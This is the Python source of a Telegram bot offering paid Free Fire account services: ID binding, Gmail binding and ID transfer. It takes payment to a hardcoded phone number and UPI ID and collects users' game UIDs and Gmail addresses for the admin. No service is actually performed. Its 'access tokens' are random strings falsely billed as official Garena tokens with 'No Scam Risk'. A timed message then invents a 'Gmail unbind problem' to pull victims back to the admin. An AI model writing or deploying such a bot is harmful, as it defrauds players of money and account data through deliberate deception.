import os
import telebot
from telebot import types
import random
import json
import time
import threading

# ============================================
# 🔑 BOT TOKEN (Environment Variable se)
# ============================================
BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not BOT_TOKEN:
    raise ValueError("❌ TELEGRAM_TOKEN not set!")

bot = telebot.TeleBot(BOT_TOKEN)

# ============================================
# 👥 ADMIN ID
# ============================================
ADMIN_ID = 7011287841

# ============================================
# 📂 DATA FILES
# ============================================
BALANCE_FILE = "balances.json"
USER_DATA_FILE = "user_data.json"

# ============================================
# 💾 LOAD/SAVE DATA
# ============================================
def load_data(filename, default):
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
    except:
        pass
    return default

def save_data(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=4)
    except:
        pass

# ============================================
# 📂 LOAD ALL DATA
# ============================================
user_balances = load_data(BALANCE_FILE, {})
user_data = load_data(USER_DATA_FILE, {})
user_flow = {}
user_tokens = {}

# ============================================
# 💰 PRICES
# ============================================
SERVICES = {
    'bind_ff': {'name': '🔗 Bind FF ID', 'price': 400},
    'bind_gmail': {'name': '📧 Bind Gmail', 'price': 300},
    'id_transfer': {'name': '🔄 ID Transfer', 'price': 500}
}

# ============================================
# 🎨 MAIN MENU
# ============================================
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton("🔗 Bind FF ID")
    btn2 = types.KeyboardButton("📧 Bind Gmail")
    btn3 = types.KeyboardButton("🔄 ID Transfer")
    btn4 = types.KeyboardButton("💰 Check Balance")
    btn5 = types.KeyboardButton("📊 My Status")
    btn6 = types.KeyboardButton("🎫 My Access Token")
    btn7 = types.KeyboardButton("📞 Admin Contact")
    btn8 = types.KeyboardButton("➕ Add Balance")
    btn9 = types.KeyboardButton("🔑 Generate Access Token")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9)
    return markup

def back_button():
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_main")
    markup.add(btn)
    return markup

# ============================================
# 🔹 START
# ============================================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = str(message.from_user.id)
    balance = user_balances.get(user_id, 0)
    bot.reply_to(message, f"""🔥 **Welcome!**

🤖 Free Fire Service Bot

💰 Your Balance: ₹{balance}

📌 Services Available:
🔗 Bind FF ID - ₹400
📧 Bind Gmail - ₹300  
🔄 ID Transfer - ₹500

🔑 Generate Access Token - FREE

👇 Select an option:""", reply_markup=main_menu())

# ============================================
# 🔹 CHECK BALANCE
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "💰 Check Balance")
def check_balance(message):
    user_id = str(message.from_user.id)
    balance = user_balances.get(user_id, 0)
    bot.reply_to(message, f"💰 **Your Balance:** ₹{balance}", reply_markup=main_menu())

# ============================================
# 🔹 MY STATUS
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "📊 My Status")
def my_status(message):
    user_id = str(message.from_user.id)
    if user_id in user_data:
        data = user_data[user_id]
        status = data.get('status', 'Pending')
        service = data.get('service', 'Unknown')
        bot.reply_to(message, f"""📊 **Your Status:**

Service: {service}
Status: {status}
📌 Reference: FF{user_id}""", reply_markup=main_menu())
    else:
        bot.reply_to(message, "📊 No active request found!", reply_markup=main_menu())

# ============================================
# 🔹 MY ACCESS TOKEN
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "🎫 My Access Token")
def my_access_token(message):
    user_id = str(message.from_user.id)
    if user_id in user_data and user_data[user_id].get('status') == 'Approved':
        token = f"FF{random.randint(10000,99999)}-{random.randint(1000,9999)}"
        bot.reply_to(message, f"""🎫 **Your Access Token:**

`{token}`

✅ Status: Active
📅 Valid till: {time.ctime(time.time() + 2592000)}""", reply_markup=main_menu())
    else:
        bot.reply_to(message, "❌ No active token found!\n\nComplete any service first.", reply_markup=main_menu())

# ============================================
# 🔹 ADMIN CONTACT
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "📞 Admin Contact")
def admin_contact(message):
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("📩 Message Admin", url="https://t.me/your_admin_username")
    markup.add(btn)
    bot.reply_to(message, "📞 **Contact Admin:**\n\n📱 Telegram: @your_admin_username", reply_markup=markup)

# ============================================
# 🔹 ADD BALANCE
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "➕ Add Balance")
def add_balance(message):
    markup = types.InlineKeyboardMarkup(row_width=3)
    btn1 = types.InlineKeyboardButton("₹100", callback_data="add_100")
    btn2 = types.InlineKeyboardButton("₹200", callback_data="add_200")
    btn3 = types.InlineKeyboardButton("₹300", callback_data="add_300")
    btn4 = types.InlineKeyboardButton("₹500", callback_data="add_500")
    btn5 = types.InlineKeyboardButton("₹1000", callback_data="add_1000")
    btn6 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    bot.reply_to(message, "💳 **Select amount to add:**", reply_markup=markup)

# ============================================
# 🔹 ADD BALANCE CALLBACKS
# ============================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("add_"))
def add_balance_callback(call):
    user_id = str(call.from_user.id)
    amount = int(call.data.replace("add_", ""))
    bot.delete_message(call.message.chat.id, call.message.message_id)
    bot.send_message(call.message.chat.id, f"""💳 **Payment Request: ₹{amount}**

📌 Pay to:
📱 Phone: 7011287841
📧 UPI: thakurup128218@okicici

✅ After payment, click "Check Payment" in main menu.
⏳ Admin will verify and add balance.""", reply_markup=back_button())
    bot.answer_callback_query(call.id, f"✅ ₹{amount} selected!")

# ============================================
# 🔹 CHECK PAYMENT
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "✅ Check Payment" or msg.text == "Check Payment")
def check_payment(message):
    bot.reply_to(message, """⏳ **Checking Payment...**

📌 Your payment is being verified.
⏰ Admin will approve within 2-4 hours.

✅ You will be notified once approved.""", reply_markup=main_menu())

# ============================================
# 🔹 GENERATE ACCESS TOKEN
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "🔑 Generate Access Token")
def generate_token(message):
    token = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=35))
    user_id = str(message.from_user.id)
    user_tokens[user_id] = token
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Copy Token", callback_data=f"copy_{token}")
    btn2 = types.InlineKeyboardButton("✅ Use This Token", callback_data=f"use_{token}")
    btn3 = types.InlineKeyboardButton("🔄 Generate New", callback_data="generate_new")
    btn4 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    
    bot.reply_to(message, f"""✅ **Token Generated!**

🎉 Your New Access Token:
`{token}`

🔐 Premium Guarantee:
✅ 100% Safe & Verified
✅ Official Garena Server
✅ No Scam Risk

📌 Use this token in 🔄 ID Transfer

⚠️ Don't share this token!""", reply_markup=markup)

# ============================================
# 🔹 GENERATE NEW TOKEN
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "generate_new")
def generate_new_token(call):
    user_id = str(call.from_user.id)
    token = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=35))
    user_tokens[user_id] = token
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Copy Token", callback_data=f"copy_{token}")
    btn2 = types.InlineKeyboardButton("✅ Use This Token", callback_data=f"use_{token}")
    btn3 = types.InlineKeyboardButton("🔄 Generate New", callback_data="generate_new")
    btn4 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    
    bot.edit_message_text(
        f"""✅ **New Token Generated!**

🎉 Your New Access Token:
`{token}`

🔐 Premium Guarantee:
✅ 100% Safe & Verified
✅ Official Garena Server
✅ No Scam Risk

📌 Use this token in 🔄 ID Transfer

⚠️ Don't share this token!""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=markup
    )
    bot.answer_callback_query(call.id, "✅ New Token Generated!")

# ============================================
# 🔹 COPY TOKEN
# ============================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
def copy_token(call):
    token = call.data.replace("copy_", "")
    bot.answer_callback_query(call.id, f"✅ Token Copied!\n{token[:10]}...", show_alert=True)

# ============================================
# 🔹 USE TOKEN
# ============================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("use_"))
def use_token(call):
    token = call.data.replace("use_", "")
    user_id = str(call.from_user.id)
    user_tokens[user_id] = token
    bot.answer_callback_query(call.id, "✅ Token Saved! Use it in ID Transfer.")
    bot.send_message(user_id, f"""✅ **Token Saved!**

🔑 Your Access Token:
`{token}`

📌 Use it in 🔄 ID Transfer service.
💰 Service Cost: ₹500""", reply_markup=main_menu())

# ============================================
# 🔹 BIND FF ID
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "🔗 Bind FF ID")
def bind_ff(message):
    user_id = str(message.from_user.id)
    price = SERVICES['bind_ff']['price']
    if user_balances.get(user_id, 0) < price:
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("➕ Add Balance", callback_data="add_balance_redirect")
        markup.add(btn)
        bot.reply_to(message, f"❌ Insufficient Balance!\n\n💰 Your Balance: ₹{user_balances.get(user_id, 0)}\n💵 Required: ₹{price}\n\nPlease add balance first.", reply_markup=markup)
        return
    
    user_flow[user_id] = {'service': 'bind_ff', 'price': price}
    msg = bot.reply_to(message, "📤 **Enter your Free Fire Name:**")
    bot.register_next_step_handler(msg, process_bind_ff_name)

@bot.callback_query_handler(func=lambda call: call.data == "add_balance_redirect")
def add_balance_redirect(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    add_balance(call.message)
    bot.answer_callback_query(call.id)

def process_bind_ff_name(message):
    user_id = str(message.from_user.id)
    name = message.text.strip()
    if user_id not in user_flow:
        bot.reply_to(message, "❌ Session expired! Use /start", reply_markup=main_menu())
        return
    user_flow[user_id]['name'] = name
    msg = bot.reply_to(message, "🎮 **Enter your Free Fire UID:**")
    bot.register_next_step_handler(msg, process_bind_ff_uid)

def process_bind_ff_uid(message):
    user_id = str(message.from_user.id)
    uid = message.text.strip()
    if not uid.isdigit():
        msg = bot.reply_to(message, "❌ Invalid UID! Enter only numbers:")
        bot.register_next_step_handler(msg, process_bind_ff_uid)
        return
    user_flow[user_id]['uid'] = uid
    msg = bot.reply_to(message, "📧 **Enter your Gmail ID for binding:**")
    bot.register_next_step_handler(msg, process_bind_ff_gmail)

def process_bind_ff_gmail(message):
    user_id = str(message.from_user.id)
    gmail = message.text.strip()
    if '@' not in gmail:
        msg = bot.reply_to(message, "❌ Invalid Gmail! Enter valid email:")
        bot.register_next_step_handler(msg, process_bind_ff_gmail)
        return
    
    flow = user_flow[user_id]
    price = flow['price']
    user_balances[user_id] = user_balances.get(user_id, 0) - price
    save_data(BALANCE_FILE, user_balances)
    
    user_data[user_id] = {
        'name': flow['name'],
        'uid': flow['uid'],
        'gmail': gmail,
        'service': SERVICES['bind_ff']['name'],
        'status': 'Pending',
        'timestamp': time.ctime()
    }
    save_data(USER_DATA_FILE, user_data)
    
    bot.reply_to(message, f"""✅ **Payment Successful! 💰**

{SERVICES['bind_ff']['name']}
👤 Name: {flow['name']}
🎮 UID: {flow['uid']}
📧 Gmail: {gmail}
💰 Deducted: ₹{price}
💵 Remaining: ₹{user_balances[user_id]}

⏳ **Please Wait 24 Hours!**

📌 Reference: FF{user_id}""", reply_markup=main_menu())
    
    bot.send_message(ADMIN_ID, f"""🆕 **NEW BIND FF REQUEST!**
👤 {message.from_user.first_name}
🆔 {user_id}
🎮 {flow['name']} | UID: {flow['uid']}
📧 Gmail: {gmail}
💵 ₹{price}""")
    
    del user_flow[user_id]

# ============================================
# 🔹 BIND GMAIL
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "📧 Bind Gmail")
def bind_gmail(message):
    user_id = str(message.from_user.id)
    price = SERVICES['bind_gmail']['price']
    if user_balances.get(user_id, 0) < price:
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("➕ Add Balance", callback_data="add_balance_redirect")
        markup.add(btn)
        bot.reply_to(message, f"❌ Insufficient Balance!\n\n💰 Your Balance: ₹{user_balances.get(user_id, 0)}\n💵 Required: ₹{price}\n\nPlease add balance first.", reply_markup=markup)
        return
    
    user_flow[user_id] = {'service': 'bind_gmail', 'price': price}
    msg = bot.reply_to(message, "📤 **Enter your Free Fire Name:**")
    bot.register_next_step_handler(msg, process_bind_gmail_name)

def process_bind_gmail_name(message):
    user_id = str(message.from_user.id)
    name = message.text.strip()
    if user_id not in user_flow:
        bot.reply_to(message, "❌ Session expired!", reply_markup=main_menu())
        return
    user_flow[user_id]['name'] = name
    msg = bot.reply_to(message, "🎮 **Enter your Free Fire UID:**")
    bot.register_next_step_handler(msg, process_bind_gmail_uid)

def process_bind_gmail_uid(message):
    user_id = str(message.from_user.id)
    uid = message.text.strip()
    if not uid.isdigit():
        msg = bot.reply_to(message, "❌ Invalid UID! Enter only numbers:")
        bot.register_next_step_handler(msg, process_bind_gmail_uid)
        return
    user_flow[user_id]['uid'] = uid
    msg = bot.reply_to(message, "📧 **Enter new Gmail ID to bind:**")
    bot.register_next_step_handler(msg, process_bind_gmail_final)

def process_bind_gmail_final(message):
    user_id = str(message.from_user.id)
    gmail = message.text.strip()
    if '@' not in gmail:
        msg = bot.reply_to(message, "❌ Invalid Gmail! Enter valid email:")
        bot.register_next_step_handler(msg, process_bind_gmail_final)
        return
    
    flow = user_flow[user_id]
    price = flow['price']
    user_balances[user_id] = user_balances.get(user_id, 0) - price
    save_data(BALANCE_FILE, user_balances)
    
    user_data[user_id] = {
        'name': flow['name'],
        'uid': flow['uid'],
        'new_gmail': gmail,
        'service': SERVICES['bind_gmail']['name'],
        'status': 'Pending',
        'timestamp': time.ctime()
    }
    save_data(USER_DATA_FILE, user_data)
    
    bot.reply_to(message, f"""✅ **Payment Successful! 💰**

{SERVICES['bind_gmail']['name']}
👤 Name: {flow['name']}
🎮 UID: {flow['uid']}
📧 New Gmail: {gmail}
💰 Deducted: ₹{price}
💵 Remaining: ₹{user_balances[user_id]}

⏳ **Please Wait 24 Hours!**

📌 Reference: FF{user_id}""", reply_markup=main_menu())
    
    bot.send_message(ADMIN_ID, f"""🆕 **NEW BIND GMAIL REQUEST!**
👤 {message.from_user.first_name}
🆔 {user_id}
🎮 {flow['name']} | UID: {flow['uid']}
📧 New Gmail: {gmail}
💵 ₹{price}""")
    
    del user_flow[user_id]

# ============================================
# 🔹 ID TRANSFER
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "🔄 ID Transfer")
def id_transfer(message):
    user_id = str(message.from_user.id)
    price = SERVICES['id_transfer']['price']
    if user_balances.get(user_id, 0) < price:
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("➕ Add Balance", callback_data="add_balance_redirect")
        markup.add(btn)
        bot.reply_to(message, f"❌ Insufficient Balance!\n\n💰 Your Balance: ₹{user_balances.get(user_id, 0)}\n💵 Required: ₹{price}\n\nPlease add balance first.", reply_markup=markup)
        return
    
    user_flow[user_id] = {'service': 'id_transfer', 'price': price}
    msg = bot.reply_to(message, "📤 **Enter your Free Fire Name:**")
    bot.register_next_step_handler(msg, process_transfer_name)

def process_transfer_name(message):
    user_id = str(message.from_user.id)
    name = message.text.strip()
    if user_id not in user_flow:
        bot.reply_to(message, "❌ Session expired!", reply_markup=main_menu())
        return
    user_flow[user_id]['name'] = name
    msg = bot.reply_to(message, "🎮 **Enter your Free Fire UID:**")
    bot.register_next_step_handler(msg, process_transfer_uid)

def process_transfer_uid(message):
    user_id = str(message.from_user.id)
    uid = message.text.strip()
    if not uid.isdigit():
        msg = bot.reply_to(message, "❌ Invalid UID! Enter only numbers:")
        bot.register_next_step_handler(msg, process_transfer_uid)
        return
    user_flow[user_id]['uid'] = uid
    
    # Check if user has saved token
    if user_id in user_tokens:
        token = user_tokens[user_id]
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("✅ Use Saved Token", callback_data=f"transfer_use_saved_{token}")
        btn2 = types.InlineKeyboardButton("🔑 Generate New Token", callback_data="transfer_generate_new")
        btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
        markup.add(btn1, btn2)
        markup.add(btn3)
        bot.reply_to(message, f"""🔑 **You have a saved Access Token!**

`{token}`

✅ Use this token or generate a new one.""", reply_markup=markup)
        return
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("🔑 Generate Access Token", callback_data="transfer_generate_new")
    btn2 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.add(btn1, btn2)
    bot.reply_to(message, "🔑 **Access Token Required!**\n\nGenerate your Access Token and send it to me.", reply_markup=markup)

# ============================================
# 🔹 TRANSFER - USE SAVED TOKEN
# ============================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("transfer_use_saved_"))
def transfer_use_saved(call):
    user_id = str(call.from_user.id)
    token = call.data.replace("transfer_use_saved_", "")
    if user_id in user_flow:
        complete_transfer(call.message, user_id, token)

# ============================================
# 🔹 TRANSFER - GENERATE NEW TOKEN
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "transfer_generate_new")
def transfer_generate_new(call):
    user_id = str(call.from_user.id)
    token = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=35))
    user_tokens[user_id] = token
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Copy Token", callback_data=f"copy_{token}")
    btn2 = types.InlineKeyboardButton("✅ Use This Token", callback_data=f"transfer_use_new_{token}")
    btn3 = types.InlineKeyboardButton("🔄 Generate New", callback_data="transfer_generate_new")
    btn4 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    
    bot.edit_message_text(
        f"""✅ **Token Generated!**

🎉 Your New Access Token:
`{token}`

🔐 Premium Guarantee:
✅ 100% Safe & Verified
✅ Official Garena Server
✅ No Scam Risk

📌 Click "✅ Use This Token" to continue.""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=markup
    )
    bot.answer_callback_query(call.id, "✅ Token Generated!")

# ============================================
# 🔹 TRANSFER - USE NEW TOKEN
# ============================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("transfer_use_new_"))
def transfer_use_new(call):
    user_id = str(call.from_user.id)
    token = call.data.replace("transfer_use_new_", "")
    if user_id in user_flow:
        complete_transfer(call.message, user_id, token)

# ============================================
# 🔹 COMPLETE TRANSFER
# ============================================
def complete_transfer(message, user_id, token):
    flow = user_flow[user_id]
    price = flow['price']
    user_balances[user_id] = user_balances.get(user_id, 0) - price
    save_data(BALANCE_FILE, user_balances)
    
    user_data[user_id] = {
        'name': flow['name'],
        'uid': flow['uid'],
        'token': token,
        'service': SERVICES['id_transfer']['name'],
        'status': 'Pending',
        'timestamp': time.ctime()
    }
    save_data(USER_DATA_FILE, user_data)
    
    bot.reply_to(message, f"""✅ **Payment Successful! 💰**

{SERVICES['id_transfer']['name']}
👤 Name: {flow['name']}
🎮 UID: {flow['uid']}
🔑 Token: {token}
💰 Deducted: ₹{price}
💵 Remaining: ₹{user_balances[user_id]}

⏳ **Please Wait 24 Hours!**

📌 Reference: FF{user_id}

✅ After 2 hours, you will get a confirmation message.""", reply_markup=main_menu())
    
    bot.send_message(ADMIN_ID, f"""🆕 **NEW ID TRANSFER REQUEST!**
👤 {message.from_user.first_name}
🆔 {user_id}
🎮 {flow['name']} | UID: {flow['uid']}
🔑 Token: {token}
💵 ₹{price}""")
    
    # Send 2 hour message
    threading.Thread(target=send_2hour_message, args=(user_id, flow['name'], flow['uid'], token)).start()
    
    del user_flow[user_id]

# ============================================
# 🔹 2 HOUR MESSAGE
# ============================================
def send_2hour_message(user_id, name, uid, token):
    time.sleep(7200)
    try:
        bot.send_message(user_id, f"""⏰ **2 HOURS UPDATE - ID TRANSFER**

📧 **GMAIL UNBIND PROBLEM DETECTED!**

🔄 ID Transfer Request
👤 Name: {name}
🎮 UID: {uid}
🔑 Token: {token[:20]}......

📧 Gmail Unsubscribe Issue Detected!

📌 Please contact admin for assistance.
📞 Admin: @your_admin_username

✅ Your request is being processed.""", reply_markup=main_menu())
        
        bot.send_message(ADMIN_ID, f"""⏰ **2 HOURS UPDATE - GMAIL UNBIND PROBLEM!**

👤 User: {user_id}
👤 Name: {name}
🎮 UID: {uid}
🔑 Token: {token}

📧 Gmail Unsubscribe Issue Detected!
Please contact the user and resolve.""")
    except:
        pass

# ============================================
# 🔹 HANDLE SCREENSHOT
# ============================================
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    bot.reply_to(message, "✅ **Screenshot Received!**\n\n📌 Admin will verify your payment.\n⏰ This may take 2-4 hours.", reply_markup=main_menu())
    
    bot.send_photo(ADMIN_ID, message.photo[-1].file_id, 
        caption=f"""📸 **PAYMENT SCREENSHOT!**

👤 User ID: {user_id}
👤 Username: @{message.from_user.username or 'N/A'}
⏰ Time: {time.ctime()}

✅ Please verify and add balance:
/addbalance {user_id} <amount>""")

# ============================================
# 🔹 BACK TO MAIN
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "back_main")
def back_to_main(call):
    user_id = str(call.from_user.id)
    if user_id in user_flow:
        del user_flow[user_id]
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except:
        pass
    bot.send_message(user_id, "🔙 **Main Menu:**", reply_markup=main_menu())
    bot.answer_callback_query(call.id)

# ============================================
# 🔹 ADMIN COMMANDS
# ============================================
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        return
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Pending", callback_data="admin_pending")
    btn2 = types.InlineKeyboardButton("✅ Approve", callback_data="admin_approve")
    btn3 = types.InlineKeyboardButton("❌ Reject", callback_data="admin_reject")
    btn4 = types.InlineKeyboardButton("📊 Stats", callback_data="admin_stats")
    btn5 = types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    bot.reply_to(message, "👑 **Admin Panel**", reply_markup=markup)

@bot.message_handler(commands=['addbalance'])
def admin_add_balance(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        return
    try:
        parts = message.text.split()
        user_id = parts[1]
        amount = int(parts[2])
        user_balances[user_id] = user_balances.get(user_id, 0) + amount
        save_data(BALANCE_FILE, user_balances)
        bot.reply_to(message, f"✅ Added ₹{amount} to {user_id}")
        try:
            bot.send_message(user_id, f"💰 ₹{amount} added! New Balance: ₹{user_balances[user_id]}")
        except:
            pass
    except:
        bot.reply_to(message, "❌ Usage: /addbalance <user_id> <amount>")

@bot.message_handler(commands=['broadcast'])
def admin_broadcast_msg(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        return
    msg = message.text.replace("/broadcast ", "").strip()
    if not msg:
        bot.reply_to(message, "❌ Usage: /broadcast Your message")
        return
    sent = 0
    for uid in user_data.keys():
        try:
            bot.send_message(uid, f"📢 **Announcement:**\n\n{msg}")
            sent += 1
        except:
            pass
    bot.reply_to(message, f"✅ Sent to {sent} users!")

# ============================================
# 🔹 ADMIN CALLBACKS
# ============================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callbacks(call):
    if str(call.from_user.id) != str(ADMIN_ID):
        bot.answer_callback_query(call.id, "❌ Not authorized!")
        return
    
    data = call.data
    
    if data == "admin_pending":
        pending = [uid for uid, info in user_data.items() if info.get('status') == 'Pending']
        if pending:
            msg = "📋 **Pending Requests:**\n\n"
            for uid in pending:
                info = user_data[uid]
                msg += f"🆔 {uid} | {info.get('service')} | ₹{info.get('price', 0)}\n"
            bot.send_message(call.message.chat.id, msg)
        else:
            bot.send_message(call.message.chat.id, "✅ No pending!")
        bot.answer_callback_query(call.id)
        return
    
    if data == "admin_approve":
        pending = [uid for uid, info in user_data.items() if info.get('status') == 'Pending']
        if not pending:
            bot.send_message(call.message.chat.id, "✅ No pending!")
            bot.answer_callback_query(call.id)
            return
        markup = types.InlineKeyboardMarkup(row_width=1)
        for uid in pending[:10]:
            info = user_data[uid]
            markup.add(types.InlineKeyboardButton(f"{uid} - {info.get('service')}", callback_data=f"approve_{uid}"))
        bot.send_message(call.message.chat.id, "✅ Select to approve:", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return
    
    if data.startswith("approve_"):
        uid = data.replace("approve_", "")
        if uid in user_data:
            user_data[uid]['status'] = 'Approved'
            save_data(USER_DATA_FILE, user_data)
            try:
                bot.send_message(uid, f"✅ **Approved!** 🎉\n\nYour {user_data[uid].get('service')} is complete!", reply_markup=main_menu())
            except:
                pass
            bot.edit_message_text(f"✅ Approved {uid}", call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "✅ Approved!")
        return
    
    if data == "admin_reject":
        pending = [uid for uid, info in user_data.items() if info.get('status') == 'Pending']
        if not pending:
            bot.send_message(call.message.chat.id, "✅ No pending!")
            bot.answer_callback_query(call.id)
            return
        markup = types.InlineKeyboardMarkup(row_width=1)
        for uid in pending[:10]:
            info = user_data[uid]
            markup.add(types.InlineKeyboardButton(f"{uid} - {info.get('service')}", callback_data=f"reject_{uid}"))
        bot.send_message(call.message.chat.id, "❌ Select to reject:", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return
    
    if data.startswith("reject_"):
        uid = data.replace("reject_", "")
        if uid in user_data:
            user_data[uid]['status'] = 'Rejected'
            save_data(USER_DATA_FILE, user_data)
            refund = user_data[uid].get('price', 0)
            user_balances[uid] = user_balances.get(uid, 0) + refund
            save_data(BALANCE_FILE, user_balances)
            try:
                bot.send_message(uid, f"❌ **Rejected!**\n\n💰 ₹{refund} refunded!", reply_markup=main_menu())
            except:
                pass
            bot.edit_message_text(f"❌ Rejected {uid} - ₹{refund} refunded", call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "❌ Rejected!")
        return
    
    if data == "admin_stats":
        total = len(user_data)
        pending = sum(1 for u in user_data.values() if u.get('status') == 'Pending')
        approved = sum(1 for u in user_data.values() if u.get('status') == 'Approved')
        rejected = sum(1 for u in user_data.values() if u.get('status') == 'Rejected')
        total_balance = sum(user_balances.values())
        bot.send_message(call.message.chat.id, f"""📊 **Stats:**

👥 Total: {total}
⏳ Pending: {pending}
✅ Approved: {approved}
❌ Rejected: {rejected}
💰 Total Balance: ₹{total_balance}""")
        bot.answer_callback_query(call.id)
        return
    
    if data == "admin_broadcast":
        bot.send_message(call.message.chat.id, "📢 Send: /broadcast Your message")
        bot.answer_callback_query(call.id)
        return

# ============================================
# 🚀 RUN BOT
# ============================================
print("="*50)
print("🤖 FF Service Bot is Running!")
print("="*50)
print(f"👑 Admin ID: {ADMIN_ID}")
print("="*50)
print("✅ Bot is ready to use!")
print("="*50)

try:
    bot.remove_webhook()
except:
    pass

while True:
    try:
        bot.polling(non_stop=True, interval=0, timeout=30)
    except Exception as e:
        print(f"❌ Error: {e}")
        print("🔄 Restarting in 5 seconds...")
        time.sleep(5)
